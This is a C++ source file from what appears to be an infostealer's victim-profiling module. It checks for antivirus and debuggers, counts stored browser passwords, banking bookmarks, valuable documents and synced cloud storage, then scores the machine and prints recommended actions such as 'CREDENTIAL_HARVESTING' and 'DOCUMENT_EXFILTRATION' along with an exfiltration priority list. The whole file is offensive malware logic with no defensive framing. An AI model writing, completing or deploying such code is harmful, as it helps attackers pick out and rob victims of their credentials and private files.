#include "target_profile.hpp"

fs_utils fsUtils;
browser_intel browserIntel;
software_enum softwareEnum;

void target_profile::generateAssessment()
{
    software_enum::SoftwareReport softwareReport = softwareEnum.generateSoftwareReport();
    browser_intel::BrowserReport browserReport = browserIntel.generateBrowserReport();
    fs_utils::DocumentsReport documentsReport = fsUtils.generateDocumentsReport();


    std::cout << "=== SOFTWARE INTELLIGENCE ===\n";
    if (softwareReport.hasAntivirus) { std::cout << "An anti-virus was found on the system: " << "\n\n"; }
    if (softwareReport.hasDebugger) { std::cout << "A debugger was found on the system: " << "\n"; }

    for (const auto& entry : softwareReport.threats) {
        std::cout << entry << "\n";
    }


    std::cout << "\n=== BROWSER INTELLIGENCE ===\n";
    std::cout << "Browser Profiles Found: " << browserReport.totalProfiles << " (";
    for (size_t i = 0; i < browserReport.browsersFound.size(); ++i) {
        std::cout << browserReport.browsersFound[i];
        if (i < browserReport.browsersFound.size() - 1) std::cout << ", ";
    }
    std::cout << ")\n";
    std::cout << "Stored Passwords: " << browserReport.credentialFiles << " entries detected\n";
    std::cout << "Financial Sites: " << browserReport.financialSites << " banking bookmarks found\n";


    std::cout << "\n=== DOCUMENT INTELLIGENCE ===\n";
    std::cout << "Total valuable documents: " << documentsReport.totalValuables << "\n";
    std::cout << "Documents: " << documentsReport.valuableDocumentsCount << " | Desktop: " << documentsReport.valuableDesktopCount << " | Downloads: " << documentsReport.valuableDownloadsCount << "\n";

    if (!documentsReport.cloudStorageFound.empty()) {
        std::cout << "Cloud Storage: ";
        for (size_t i = 0; i < documentsReport.cloudStorageFound.size(); ++i) {
            std::cout << documentsReport.cloudStorageFound[i];
            if (i < documentsReport.cloudStorageFound.size() - 1) std::cout << ", ";
        }
        std::cout << " synchronized (" << documentsReport.cloudStorageSize << ")\n";
    }

    TargetAssessment assessment = analyzeTarget();

    std::cout << "\n=== ENHANCED TARGET ANALYSIS ===\n";
    std::cout << "Target Classification: " << assessment.targetClassification << "\n";

    std::cout << "Primary Threats: ";
    for (size_t i = 0; i < assessment.primaryThreats.size(); ++i) {
        std::cout << assessment.primaryThreats[i];
        if (i < assessment.primaryThreats.size() - 1) std::cout << ", ";
    }
    std::cout << "\n";

    std::cout << "Recommended Action: " << assessment.recommendedAction << "\n";
    std::cout << "Security Posture: " << assessment.securityPosture << "\n";

    std::cout << "Exfiltration Priority: ";
    for (size_t i = 0; i < assessment.exfiltrationPriority.size(); ++i) {
        std::cout << assessment.exfiltrationPriority[i];
        if (i < assessment.exfiltrationPriority.size() - 1) std::cout << ", ";
    }
    std::cout << "\n";
}

target_profile::TargetAssessment target_profile::analyzeTarget()
{
    TargetAssessment assessment;

    auto softwareReport = softwareEnum.generateSoftwareReport();
    auto browserReport = browserIntel.generateBrowserReport();
    auto documentsReport = fsUtils.generateDocumentsReport();

    int targetScore = 0;

    if (browserReport.credentialFiles >= 5) { targetScore += 3; }
    else if (browserReport.credentialFiles >= 2) { targetScore += 2; }
    else if (browserReport.credentialFiles >= 1) { targetScore += 1; }

    if (documentsReport.totalValuables >= 10) { targetScore += 3; }
    else if (documentsReport.totalValuables >= 5) { targetScore += 2; }
    else if (documentsReport.totalValuables >= 1) { targetScore += 1; }

    if (softwareReport.hasDebugger) { targetScore += 2; }

    // TODO: Classify based on score
    // TODO: Determine security posture
    // TODO: Set primary threats
    // TODO: Recommend actions

    // Target Classification
    if (targetScore >= 6) {
        assessment.targetClassification = "HIGH-VALUE BUSINESS USER";
    }
    else if (targetScore >= 3) {
        assessment.targetClassification = "MODERATE-VALUE TARGET";
    }
    else {
        assessment.targetClassification = "LOW-VALUE TARGET";
    }

    // Security Posture Assessment
    if (!softwareReport.hasAntivirus && softwareReport.hasDebugger) {
        assessment.securityPosture = "WEAK (development environment)";
    }
    else if (!softwareReport.hasAntivirus) {
        assessment.securityPosture = "MODERATE (consumer-grade protection)";
    }
    else {
        assessment.securityPosture = "STRONG (security software detected)";
    }

    // Primary Threats Identification
    if (browserReport.credentialFiles > 0) {
        assessment.primaryThreats.push_back("Financial credentials");
    }
    if (documentsReport.totalValuables > 0) {
        assessment.primaryThreats.push_back("Business documents");
    }
    if (softwareReport.hasDebugger) {
        assessment.primaryThreats.push_back("Development tools");
    }
    
    // Recommended Actions
    if (targetScore >= 6) {
        if (browserReport.credentialFiles > 0 && documentsReport.totalValuables > 0) {
            assessment.recommendedAction = "CREDENTIAL_HARVESTING + DOCUMENT_STAGING";
        }
        else if (browserReport.credentialFiles > 0) {
            assessment.recommendedAction = "CREDENTIAL_HARVESTING";
        }
        else {
            assessment.recommendedAction = "DOCUMENT_EXFILTRATION";
        }
    }
    else if (targetScore >= 3) {
        assessment.recommendedAction = "LIMITED_DATA_COLLECTION";
    }
    else {
        assessment.recommendedAction = "RECONNAISSANCE_ONLY";
    }

    // Exfiltration Priority
    if (browserReport.credentialFiles > 0) {
        assessment.exfiltrationPriority.push_back("Browser passwords");
    }
    if (documentsReport.valuableDocumentsCount > 0) {
        assessment.exfiltrationPriority.push_back("Recent documents");
    }
    if (documentsReport.valuableDesktopCount > 0) {
        assessment.exfiltrationPriority.push_back("Desktop files");
    }

    return assessment;
}